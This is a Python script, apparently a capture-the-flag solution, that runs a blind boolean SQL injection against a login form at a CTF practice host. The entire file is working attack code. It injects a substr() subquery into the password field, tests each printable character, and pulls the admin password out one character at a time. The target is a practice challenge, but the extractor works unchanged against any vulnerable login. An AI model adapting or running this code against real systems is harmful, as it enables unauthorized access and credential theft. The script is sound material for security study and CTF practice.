#!/usr/bin/env python

import string
import requests
import re

url = "http://ctfq.sweetduet.info:10080/~q6/"
sourcestr = string.printable
flag = "Congratulations"
result = ""
idx = 0

while True:
    idx += 1
    data = {
        "id": "admin",
        "pass": "test' or substr((select pass from user limit 1 offset 0),%d,1)='%s" % (idx, "")
    }

    res = requests.post(url, data=data)

    if(re.search(flag, res.text)):
        break
    else:
        pass

    for x in sourcestr:
        data = {
            "id": "admin",
            "pass": "test' or substr((select pass from user limit 1 offset 0),%d,1)='%s" % (idx, x)
        }

        print("[*] Testing: %s" % x)

        res = requests.post(url, data=data)

        if(re.search(flag, res.text)):
            result += x
            print("[+] Hit: %s" % x)
            break
        else:
            pass

print("[+] RESULT: %s" % result)
